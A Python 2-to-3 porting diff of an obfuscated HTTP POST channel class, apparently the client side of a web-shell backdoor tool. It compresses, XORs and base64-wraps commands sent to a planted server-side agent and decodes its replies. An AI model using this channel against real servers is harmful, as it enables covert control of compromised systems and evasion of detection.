@@ -1,15 +1,15 @@
 from core.loggers import dlog
 from core import config
 import re
-import urlparse
+import urllib.parse
 import random
 import utils
 import string
 import base64
-import urllib2
+import urllib.request, urllib.error, urllib.parse
 import hashlib
 import zlib
-import httplib
+import http.client
 import string
 
 PREPEND = utils.strings.randstr(16, charset = string.printable)
@@ -21,22 +21,23 @@ class ObfPost:
 
         # Generate the 8 char long main key. Is shared with the server and
         # used to check header, footer, and encrypt the payload.
+        password = password.encode('utf-8')
 
         passwordhash = hashlib.md5(password).hexdigest().lower()
-        self.shared_key = passwordhash[:8]
-        self.header = passwordhash[8:20]
-        self.trailer = passwordhash[20:32]
+        self.shared_key = passwordhash[:8].encode('utf-8')
+        self.header = passwordhash[8:20].encode('utf-8')
+        self.trailer = passwordhash[20:32].encode('utf-8')
         
         self.url = url
-        url_parsed = urlparse.urlparse(url)
+        url_parsed = urllib.parse.urlparse(url)
         self.url_base = '%s://%s' % (url_parsed.scheme, url_parsed.netloc)
 
         # init regexp for the returning data
         self.re_response = re.compile(
-            "%s(.*)%s" % (self.header, self.trailer), re.DOTALL
+            b"%s(.*)%s" % (self.header, self.trailer), re.DOTALL
             )
         self.re_debug = re.compile(
-            "%sDEBUG(.*?)%sDEBUG" % (self.header, self.trailer), re.DOTALL
+            b"%sDEBUG(.*?)%sDEBUG" % (self.header, self.trailer), re.DOTALL
             )
 
         # Load agent
@@ -51,14 +52,19 @@ class ObfPost:
 
     def send(self, original_payload, additional_handlers = []):
 
-        obfuscated_payload = base64.b64encode(
-            utils.strings.sxor(
+        if isinstance(original_payload, str):
+            original_payload = original_payload.encode('utf-8')
+
+        xorred_payload = utils.strings.sxor(
                 zlib.compress(original_payload),
-                self.shared_key)).rstrip('=')
+                self.shared_key
+                )
+
+        obfuscated_payload = base64.b64encode(xorred_payload).rstrip(b'=')
 
         wrapped_payload = PREPEND + self.header + obfuscated_payload + self.trailer + APPEND
 
-        opener = urllib2.build_opener(*additional_handlers)
+        opener = urllib.request.build_opener(*additional_handlers)
 
         additional_ua = ''
         for h in self.additional_headers:
@@ -82,7 +88,7 @@ class ObfPost:
 
         try:
             response = opener.open(url, data = wrapped_payload).read()
-        except httplib.BadStatusLine as e:
+        except http.client.BadStatusLine as e:
             # TODO: add this check to the other channels
             log.warn('Connection closed unexpectedly, aborting command.')
             return
@@ -98,8 +104,10 @@ class ObfPost:
         matched = self.re_response.search(response)
     
         if matched and matched.group(1):
-            return zlib.decompress(
+
+            response = zlib.decompress(
                 utils.strings.sxor(
-                    base64.b64decode(
-                        matched.group(1)),
+                    base64.b64decode(matched.group(1)),
                     self.shared_key))
+
+            return response
